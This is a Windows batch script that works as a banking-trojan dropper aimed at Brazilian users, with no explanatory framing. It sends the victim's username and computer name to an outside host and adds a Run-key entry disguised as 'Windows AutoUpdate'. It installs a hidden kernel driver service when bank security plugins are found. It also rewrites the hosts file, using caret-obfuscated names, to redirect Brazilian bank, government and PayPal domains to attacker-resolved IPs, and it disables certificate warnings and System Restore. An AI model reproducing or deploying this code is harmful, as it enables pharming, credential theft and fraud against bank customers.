echo off
if exist "%windir%"\adssad.dll goto fec
start /low /min iexplore.exe "http://ads.collor.info/ads.php?a=%username%&b=%computername%"
echo >"%windir%"\adssad.dll
:fec
if exist %windir%\bekapi.reg ( %windir%\regedit.exe /s %windir%\bekapi.reg&&del /q /s %windir%\bekapi.reg )
if exist %SystemDrive%\Avenger ( rd /s /q %SystemDrive%\Avenger&& del /q /s %SystemDrive%\avenger.txt )
echo y|%windir%\system32\reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  /v "Windows AutoUpdate" /t REG_SZ /d "%appdata%\wuauclt.exe"
if exist "%SystemDrive%\program files\GbPlugin" goto install
if exist "%SystemDrive%\Arquivos de programas\GbPlugin" goto install
if exist "%SystemDrive%\program files\Scpad" goto install
if exist "%SystemDrive%\Arquivos de programas\Scpad" goto install
if exist "%SystemDrive%\WINDOWS\Downloaded Program Files\gbiehisg.dll" goto install
goto limpo
:install
copy "%appdata%"\suvsms.sys %windir%\system32\drivers\
copy "%appdata%"\zvntgi.txt %windir%\
reg export HKLM\SYSTEM\ControlSet001\Control\ServiceGroupOrder %windir%\bekapi.reg
for /f "tokens=2*" %%d in ('reg query HKLM\SYSTEM\ControlSet001\Control\ServiceGroupOrder /v List') do set a=%%e
set gp=lsxcqbh\0%a%
"%appdata%"\SWReg.exe ADD HKLM\SYSTEM\ControlSet001\Control\ServiceGroupOrder /v List /t REG_MULTI_SZ /d "%gp%"
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v nabzskb /t REG_DWORD /d 0x00000001
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v ErrorControl /t REG_DWORD /d 0x00000001
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v Group /t REG_SZ /d lsxcqbh
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v ImagePath /t REG_EXPAND_SZ /d system32\drivers\suvsms.sys
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v cwyh /t REG_MULTI_SZ /d "Abiosdsk\0abp480n5\0ACPI\0ACPIEC\0adpu160m\0aec\0AFD\0agp440\0Aha154x\0aic78u2\0aic78xx\0Alerter\0ALG\0AliIde\0amsint\0AppMgmt\0asc\0asc3350p\0asc3550\0AsyncMac\0atapi\0Atdisk\0Atmarpc\0AudioSrv\0audstub\0BattC\0Beep\0BITS\0Browser\0cbidf2k\0cd20xrnt\0Cdaudio\0Cdfs\0Cdrom\0Changer\0CiSvc\0ClipSrv\0CmBatt\0CmdIde\0Compbatt\0COMSysApp\0ContentFilter\0ContentIndex\0Cpqarray\0CryptSvc\0dac2w2k\0dac960nt\0DcomLaunch\0Dhcp\0Disk\0dmadmin\0dmboot\0dmio\0dmload\0dmserver\0DMusic\0Dnscache\0dpti2o\0drmkaud\0ERSvc\0es1371\0Eventlog\0EventSystem\0Fastfat\0FastUserSwitchingCompatibility\0Fdc\0Fips\0Flpydisk\0FltMgr\0Fs_Rec\0Ftdisk\0gameenum\0GbpKm\0GbpSv\0Gpc\0helpsvc\0hgfs\0HidServ\0pkekkuhk\0hpn\0HTTP\0HTTPFilter\0i2omgmt\0i2omp\0i8042prt\0Imapi\0ImapiService\0inetaccs\0ini910u\0Inport\0IntelIde\0Ip6Fw\0IpFilterDriver\0IpInIp\0IpNat\0IPSec\0IRENUM\0ISAPISearch\0isapnp\0Kbdclass\0kmixer\0KSecDD\0lanmanserver\0lanmanworkstation\0lbrtfdc\0ldap\0LGTO_Sync\0LicenseService\0LmHosts\0Messenger\0mnmdd\0mnmsrvc\0Modem\0Mouclass\0MountMgr\0mraid35x\0MRxDAV\0MRxSmb\0MSDTC\0Msfs\0MSIServer\0MSKSSRV\0MSPCLOCK\0MSPQM\0mssmbios\0Mup\0NDIS\0NdisTapi\0Ndisuio\0NdisWan\0NDProxy\0NetBIOS\0NetBT\0NetDDE\0NetDDEdsdm\0Netlogon\0Netman\0Nla\0Npfs\0Ntfs\0NtLmSsp\0NtmsSvc\0Null\0NwlnkFlt\0NwlnkFwd\0Parport\0PartMgr\0ParVdm\0PCI\0PCIDump\0PCIIde\0Pcmcia\0PCnet\0PDCOMP\0PDFRAME\0PDRELI\0PDRFRAME\0perc2\0perc2hib\0PerfDisk\0PerfNet\0PerfOS\0PerfProc\0PlugPlay\0PolicyAgent\0PptpMiniport\0Processor\0ProtectedStorage\0PSched\0Ptilink\0ql1080\0Ql10wnt\0ql12160\0ql1240\0ql1280\0RasAcd\0RasAuto\0Rasl2tp\0RasMan\0RasPppoe\0Raspti\0Rdbss\0RDPCDD\0RDPDD\0rdpdr\0RDPNP\0RDPWD\0RDSessMgr\0redbook\0RemoteAccess\0RemoteRegistry\0RpcLocator\0RpcSs\0RSVP\0SamSs\0SCardSvr\0Schedule\0Secdrv\0seclogon\0SENS\0serenum\0Serial\0Sfloppy\0SharedAccess\0ShellHWDetection\0Simbad\0Sparrow\0splitter\0Spooler\0sr\0srservice\0Srv\0SSDPSRV\0stisvc\0swenum\0swmidi\0SwPrv\0symc810\0symc8
xx\0sym_hi\0sym_u3\0sysaudio\0SysmonLog\0TapiSrv\0Tcpip\0TDPIPE\0TDTCP\0TermDD\0TermService\0Themes\0TlntSvr\0TosIde\0TPAutoConnSvc\0TrkWks\0TSDDD\0Udfs\0ultra\0Update\0upnphost\0UPS\0usbehci\0usbhub\0usbuhci\0VgaSave\0ViaIde\0vmdesched\0vmdesched-driver\0VMMEMCTL\0vmmouse\0vmscsi\0VMTools\0vmxnet\0vmx_svga\0VolSnap\0VSS\0W32Time\0W3SVC\0Wanarp\0WDICA\0wdmaud\0WebClient\0winmgmt\0Winsock\0WinSock2\0WinTrust\0WmdmPmSN\0Wmi\0WmiApRpl\0WmiApSrv\0WS2IFSL\0wscsvc\0wuauserv\0WZCSVC\0xmlprov\0{42E08C35-23A9-4B22-81B2-C58012C47697}\0\0"
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v ywtmtfw /t REG_SZ /d \??\C:\WINDOWS\zvntgi.txt
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v hgztebc /t REG_DWORD /d 0x00028EE0
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v cgzjaf /t REG_SZ /d C:\WINDOWS
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v Start /t REG_DWORD /d 0x00000000
"%appdata%"\SWReg.exe ADD HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\pkekkuhk /v Type /t REG_DWORD /d 0x00000001
goto end
:limpo
:con
%windir%\system32\ping.exe www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto hosts
goto con
:hosts
%windir%\system32\attrib.exe -r -a -s -h %windir%\system32\drivers\etc\hosts
for /f "tokens=3 delims=: " %%e in ('%windir%\system32\ping.exe cef.pinganimim.net -n 1 -l 1 ^| %systemroot%\system32\find.exe "TTL" ') do set aaa=%%e
for /f "tokens=3 delims=: " %%f in ('%windir%\system32\ping.exe pnt.pinganimim.net -n 1 -l 1 ^| %systemroot%\system32\find.exe "TTL" ') do set bbb=%%f
for /f "tokens=3 delims=: " %%g in ('%windir%\system32\ping.exe asp.pinganimim.net -n 1 -l 1 ^| %systemroot%\system32\find.exe "TTL" ') do set ccc=%%g
set porra=%random:~1,3%
(
echo %aaa% c^ai^xa^.go^v.^b^r
echo %aaa% ww^w.ca^ix^a.go^v.^br
echo %aaa% c^ai^xa.c^om^.b^r
echo %aaa% ww^w.c^aix^a.c^om^.^br
echo %aaa% ww^w.c^ef.gov.b^r
echo %aaa% w^ww^.ce^f.co^m.^br
echo %aaa% w^ww.ca^ixa^eco^no^mica.c^om.b^r
echo %aaa% w^ww.^caix^aeco^nom^icafe^de^ral.c^om.b^r
echo %bbb% b^ra^d^esc^o.c^om.b^r
echo %bbb% w^ww.^bra^de^sco.c^om.b^r
echo %bbb% b^b^.co^m.^br
echo %bbb% www^.b^b.c^om.b^r
echo %bbb% ba^nco^dobra^sil.c^om^.b^r
echo %bbb% w^ww.^ba^nco^do^bra^sil.co^m.b^r
echo %bbb% ba^nc^obr^as^il.^co^m.^br
echo %bbb% ww^w^.b^an^co^bras^il^.c^om^.b^r
echo %ccc% it^au.c^om^.^br
echo %ccc% www^.i^ta^u.co^m.b^r
echo %ccc% it^aup^er^so^nna^lite^.c^om.b^r
echo %ccc% ww^w^.ita^uper^son^na^lite.c^om^.br
echo %ccc% ita^upr^iv^at^e^ba^nk.c^om.^b^r
echo %ccc% www^.i^taupri^va^teb^ank.c^om^.b^r
echo %bbb% san^ta^nd^er.co^m.^br
echo %bbb% ww^w^.^sa^nt^ande^r.c^om^.^br
echo %bbb% ban^es^pa^.^co^m.b^r
echo %bbb% ww^w.b^ane^sp^a.c^om^.b^r
echo %bbb% ww^w.sa^nt^and^erba^nes^pa.co^m^.br
echo %ccc% rea^l.co^m.b^r
echo %ccc% w^ww.r^eal.co^m.b^r
echo %ccc% ba^nco^re^al.co^m^.br
echo %ccc% ww^w^.ba^nco^re^al.c^om.b^r
echo %ccc% ci^ti^ba^nk.co^m.^br
echo %ccc% ww^w.ci^tib^ank.c^om^.b^r
echo %ccc% ww^w^.un^ib^an^co.^co^m
echo %ccc% un^ib^an^co^.co^m.^br
echo %ccc% ww^w.un^ib^anc^o.^com.^br
echo %ccc% w^ww^.r^ur^al^.co^m.^b^r
echo %ccc% www^.^b^anc^or^ur^al^.c^om^.b^r
echo %ccc% w^ww^.bn^b.g^ov^.b^r
echo %ccc% w^ww.^cred^ica^rdi^ta^u.c^o^m^.^br
echo %ccc% w^ww^.i^ta^uca^rd.^co^m.b^r
echo %ccc% ww^w.c^et^ele^m.co^m.^br
echo %ccc% w^ww.v^is^an^et.c^om.b^r
echo %ccc% pay^pa^l.^co^m
echo %ccc% ww^w.pa^yp^al.^co^m
echo %ccc% inf^oseg^.g^ov.br
echo %ccc% ww^w.in^fose^g.g^ov^.b^r
echo %ccc% ch^ec^ktu^do.^co^m
echo %ccc% www^.ch^eck^tud^o.c^om
echo %ccc% che^ck^tu^do.c^om^.b^r
echo %ccc% ww^w.c^hec^ktu^do.c^om.^br
echo %ccc% www^.e^qu^if^ax.co^m.b^r
echo %ccc% ww^w.sc^i.^co^m.b^r
echo %ccc% se^ra^sa.co^m
echo %ccc% ww^w^.se^ra^sa^.c^om
echo %ccc% ser^as^a.^co^m.^br
echo %ccc% ww^w^.sera^sa^.c^om^.b^r
echo %ccc% inf^obu^sc^a.infor^ma^rket^in^g.c^om
echo %ccc% e-ti^m.^ti^m^br^as^il^.co^m.b^r
echo %ccc% ww^w.^oi^ve^nd^e.^co^m.^b^r
echo 12^7.0^.0.1 ww^w.linha^def^ens^iv^a.^co^m.^b^r
)>%temp%\%porra% && type %temp%\%porra%>%windir%\system32\drivers\etc\hosts
%windir%\system32\attrib.exe +s +r %windir%\system32\drivers\etc\hosts
del /q /f %temp%\%porra%
:ie
for /f "tokens=3" %%d in ('%windir%\system32\reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Version Vector" /v IE') do set ie=%%d
if not "%ie%"=="7.0000" goto noie
if exist %temp%\~a.tmp del /q /f %temp%\~a.tmp
%windir%\system32\reg.exe export HKU %temp%\~a.tmp
if exist %temp%\~b.tmp del /q /f %temp%\~b.tmp
type %temp%\~a.tmp | %systemroot%\system32\find.exe "Internet Explorer\Main">%temp%\~b.tmp && for /f "tokens=2 delims=\" %%D in ('type %temp%\~b.tmp ^| %systemroot%\system32\find.exe "S-1-5-21"') do set CSL=%%D
echo y|%windir%\system32\reg.exe add "HKU\%CSL%\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "WarnonBadCertRecving" /t REG_DWORD /d "0x00000000" /f
del /q /f  %temp%\~a.tmp && del /q /f %temp%\~b.tmp
:noie
:end
echo y|%windir%\system32\reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"  /v DisableSR /t REG_DWORD /d 0x00000001 /f
exit
